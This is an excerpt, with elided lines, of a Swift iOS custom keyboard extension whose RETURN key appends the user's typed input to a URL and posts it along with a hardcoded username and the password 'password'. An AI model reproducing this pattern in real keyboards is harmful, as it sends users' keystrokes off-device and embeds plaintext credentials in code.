...
class KeyboardViewController: UIInputViewController {
    ...
    override func viewDidLoad() {
        ...
        let buttonTitles3 = ["cmu", "Z", "X", "C", "V", "B", "N", "M", "␈"]
        let buttonTitles4 = ["123", "KEY", "SPACE", "RETURN"]
    ...
    func didTapButton(sender: AnyObject?) {
        ...
        if let title = button.titleForState(.Normal) {
            ...
            case "RETURN" :
                ...
                var str1 = str + input
                self.post(["username":"priyanksanghavi", "password":"password"],url: str1)
                input = ""
